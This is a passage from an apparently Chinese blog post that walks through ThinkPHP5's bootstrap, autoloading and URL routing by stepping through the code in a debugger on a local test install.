+<p>根命名空间是一个关键的概念，以上面的\think\cache\driver\File类为例，think就是一个根命名空间，其对应的初始命名空间目录就是系统的类库目录（thinkphp/library/think），我们可以简单的理解一个根命名空间对应了一个类库包。</p>
+<p>系统内置的几个根命名空间（类库包）如下：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">描述</th>
+<th style="text-align:left">类库目录</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">think</td>
+<td style="text-align:left">系统核心类库</td>
+<td style="text-align:left">thinkphp/library/think</td>
+</tr>
+<tr>
+<td style="text-align:left">traits</td>
+<td style="text-align:left">系统Trait类库</td>
+<td style="text-align:left">thinkphp/library/traits</td>
+</tr>
+<tr>
+<td style="text-align:left">app</td>
+<td style="text-align:left">应用类库</td>
+<td style="text-align:left">application</td>
+</tr>
+</tbody>
+</table>
+<p>接下来跟着文章进行框架的流程分析</p>
+<h2 id="框架流程分析">框架流程分析</h2>
+<p>我们先进入到默认的入口文件（<strong>public/index.php</strong>）</p>
+<pre><code class="hljs php"><span class="hljs-comment">// 定义应用目录</span>
+<span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">'APP_PATH'</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/../application/'</span>);
+<span class="hljs-comment">// 加载框架引导文件</span>
+<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/../thinkphp/start.php'</span>;</code></pre>
+<p>引入start.php(框架引导文件)进入到里面看看有什么。进入框架引导文件(<strong>thinkphp/start.php</strong>)看到两行代码</p>
+<pre><code class="hljs php"><span class="hljs-comment">// ThinkPHP 引导文件</span>
+<span class="hljs-comment">// 1. 加载基础文件</span>
+<span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">'/base.php'</span>;
+<span class="hljs-comment">// 2. 执行应用</span>
+<span class="hljs-title class_">App</span>::<span class="hljs-title function_ invoke__">run</span>()-&gt;<span class="hljs-title function_ invoke__">send</span>();</code></pre>
+<p><strong>(1)基础文件（thinkphp/base.php）</strong></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611172954078.png" alt="image-20240611172954078"></p>
+<p>此文件的前面都是大量的常量定义，不必叙述，根据文章所说，这里有几个重点</p>
+<p>首先是加载了loader类，然后是加载环境变量配置文件，接着我们跟进后面的注册自动加载</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611173700246.png" alt="image-20240611173700246"></p>
+<p>可以看到这里利用PHP底层函数sql_autoload_register函数，去将函数注册到sql_autoload队列中。</p>
+<p>如果该队列的函数尚未激活，则激活它们。此函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。通过注册自动加载器，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</p>
+<p>之后按顺序就是注册命名空间定义:<code>think=&gt;thinkphp/library/think，behavior=&gt;thinkphp/library/behavior，traits=&gt;thinkphp/library/traits</code></p>
+<p>加载类库映射文件，Composer 自动加载支持，自动加载 extend 目录</p>
+<p><strong>(2)执行应用（thinkphp/library/think/App.php）</strong></p>
+<p>这里跟着源码的注释即可</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611174453968.png" alt="image-20240611174453968"></p>
+<p>首先判断参数request是否为空，然后返回一个request实例。接着初始化，查看是否存在模块/控制器，然后进行绑定。然后对default_filter配置信息进行filter函数的过滤，加载系统语言包，记录当前应用调度信息以及路由和请求信息，并把这些信息加载到log日志中。然后开始监听，进行请求缓存的检查并进行<code>$data = self::exec($dispatch, $config);</code>，根据$dispatch进行不同的调度，返回$data。最后清除类的实例化，输出数据到客户端，$response = $data;，返回一个response实例，然后结束监听，再调用send方法将数据返回给客户端</p>
+<h2 id="url路由解析动态调试分析">URL路由解析动态调试分析</h2>
+<p>URL路由解析及页面输出工作可以分为5部分。</p>
+<ol>
+<li>路由定义：完成路由规则的定义和参数设置</li>
+<li>路由检测：检查当前的URL请求是否有匹配的路由</li>
+<li>路由解析：解析当前路由实际对应的操作。</li>
+<li>路由调度：执行路由解析的结果调度。</li>
+<li>响应输出及应用结束：将路由调度的结果数据输出至页面并结束程序运行。</li>
+</ol>
+<p>我们通过动态调试来分析，这样能清楚明了的看到程序处理的整个流程，由于在Thinkphp中，配置不同其运行流程也会不同，所以我们采用默认配置来进行分析。</p>
+<h3 id="路由定义">路由定义</h3>
+<p>通过配置route目录下的文件对路由进行定义，这里我们采取默认的路由定义，就是不做任何路由映射。</p>
+<h3 id="路由检测">路由检测</h3>
+<p>这部分内容主要是对当前的URL请求进行路由匹配。在路由匹配前先会获取URL中的pathinfo，然后再进行匹配，但如果没有定义路由，则会把当前pathinfo当作默认路由。</p>
+<p>首先我们设置好IDE环境，并在路由检测功能处下断点。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611175344936.png" alt="image-20240611175344936"></p>
+<p>然后我们请求HelloWorld.php文件。【index模块helloworld控制器index方法】</p>
+<pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/thinkphp5/public/index.php/<span class="hljs-keyword">index</span>/HelloWorld/<span class="hljs-keyword">index</span>/hybcx/hacker</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611175848039.png" alt="image-20240611175848039"></p>
+<p>上图，定义一个用于获取调度信息的变量，然后进入if语句，开始对url路由进行routeCheck检测，我们跟进</p>
+<p>这里下图，刚开始调用了path函数，我们跟进去看</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611175934648.png" alt="image-20240611175934648"></p>
+<p>开始的话path肯定是空的，那么会进入到if语句中，我们进行步过，然后跟进pathinfo，因为这有关于我们的路由信息</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611180124813.png" alt="image-20240611180124813"></p>
+<p>这里会根据不同的请求方式获取当前URL的pathinfo信息，这里我们的请求方式是pathinfo，直接通过<code>$_SERVER(‘PATH_INFO’)</code>去获取，获取之后会使用ltrim()函数对<code>$pathinfo</code>进行处理去掉左侧的’/’符号。Ps:如果以兼容模式请求，则会用<code>$_GET</code>方法获取。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611180254363.png" alt="image-20240611180254363"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611180831225.png" alt="image-20240611180831225"></p>
+<p>ltrim — 删除字符串开头的空白字符（或其他字符），这里指定了删除/字符</p>
+<p>path_info：/index/HelloWorld/index/hybcx/hacker</p>
+<pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;path = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/\.('</span> . <span class="hljs-title function_ invoke__">ltrim</span>(<span class="hljs-variable">$suffix</span>, <span class="hljs-string">'.'</span>) . <span class="hljs-string">')$/i'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$pathinfo</span>);</code></pre>
+<p>这段代码的作用是从路径信息 <code>$pathinfo</code> 中移除以特定后缀（<code>$suffix</code>）结尾的部分（包括点号）。</p>
+<p>下图得到返回值之后，赋值给了path变量，然后开始进行路由检测，导入系统为我们默认配置好的路由，继续走就到了下图这里，进行路由检测，我们跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611182937139.png" alt="image-20240611182937139"></p>
+<p>首先将我们的路由用|分隔符分割开了，接着获取当前的请求方法：get，后去当前请求类型的路由规则等等等等，都是一系列默认的配置</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611183302020.png" alt="image-20240611183302020"></p>
+<p>rtrim — 删除字符串末端的空白字符（或者其他字符）</p>
+<p>一直到了下图这里，开始进行路由规则检测，跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611183338443.png" alt="image-20240611183338443"></p>
+<p>通过for循环，主要是根据rules的配置，来获取他想要的信息，但我们这里没有进行额外的配置，都是按照系统默认来的，因此不必过多注意</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611183627003.png" alt="image-20240611183627003"></p>
+<p>第二次循环之后，下图这里得到了一个key</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611184209298.png" alt="image-20240611184209298"></p>
+<h3 id="路由解析">路由解析</h3>
+<p>继续步过来到这里，进行路由的解析，跟进对应的方法</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611184625607.png" alt="image-20240611184625607"></p>
+<p>该方法中，进行了初步的处理之后，调用了pathUrlPath，我们跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611184827082.png" alt="image-20240611184827082"></p>
+<p>发现这里是对我们的url路由，进行分割处理，最终得到了上图的数组形式</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611184815105.png" alt="image-20240611184815105"></p>
+<p>按/符号，将url路由分割成数组</p>
+<p>下图这里得到了路由的模块：index</p>
+<p>array_shift — 将数组开头的单元移出数组</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611185034312.png" alt="image-20240611185034312"></p>
+<p>接下来就是获取到了控制器、对应的操作、操作对应的参数，对于参数的获取，我们跟进parseUrlParams</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611185854398.png" alt="image-20240611185854398"></p>
+<p>直接利用了|分割成了数组，然后返回</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611185815060.png" alt="image-20240611185815060"></p>
+<p>处理完之后，return返回了模块和路由</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611190032285.png" alt="image-20240611190032285"></p>
+<p>到下图位置，就是当前的模块和路由获取到的值</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611190149190.png" alt="image-20240611190149190"></p>
+<h3 id="路由调度">路由调度</h3>
+<p>又回到app.php，开始监听之后，执行了exec函数，我们跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611192757464.png" alt="image-20240611192757464"></p>
+<p>switch语句匹配对应代码，这里我们是module，跟进module函数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611192916238.png" alt="image-20240611192916238"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611193238217.png" alt="image-20240611193238217"></p>
+<p>方框标注的部分，逻辑是存在一个短路的三元符，然后判断result数组的第一个元素，是否存在，存在的话返回自身的值，否则返回config指定的值。strtolower是转为小写，strip_tags是去除字符串中的PHP和HTML标签</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611193858758.png" alt="image-20240611193858758"></p>
+<p>这里获取到了控制器名字，操作名字，然后调用controller设置当前请求的控制器和操作，跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611193956182.png" alt="image-20240611193956182"></p>
+<p>返回控制器名字</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611194054703.png" alt="image-20240611194054703"></p>
+<p>继续到了下面的loader::controller，跟进后发现，实例化request之后调用了module，随后往下走，获取到class类名，然后判断该类名存在，之后调用invokeClass，跟进</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611194216533.png" alt="image-20240611194216533"></p>
+<p>获取到操作名之后，也就是操作方法（函数）调用invokeMethod方法（有点Java反射了）</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611194550612.png" alt="image-20240611194550612"></p>
+<p>跟进之后发现一个bindParams函数，跟进到下图这里，逻辑是获取到参数</p>
+<p>这里调用了<code>bindParams()</code>方法对<code>$var</code>参数数组进行处理，获取了HelloWorld反射类的绑定参数，获取到后将<code>$args</code>传入<code>invokeArgs()</code>方法，进行反射执行。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611194955817.png" alt="image-20240611194955817"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195115934.png" alt="image-20240611195115934"></p>
+<p>最后再步过一下，发现到了我们的对应的操作函数下的位置</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195156110.png" alt="image-20240611195156110"></p>
+<p>返回数据data，到了下图继续返回</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195224360.png" alt="image-20240611195224360"></p>
+<h3 id="响应输出及应用结束">响应输出及应用结束</h3>
+<p>到这里判断响应输出类型，得到响应并返回</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240611195320531.png" alt="image-20240611195320531"></p>
+<p>然后又调用send，下图这里先是处理输出数据，跟进</p>
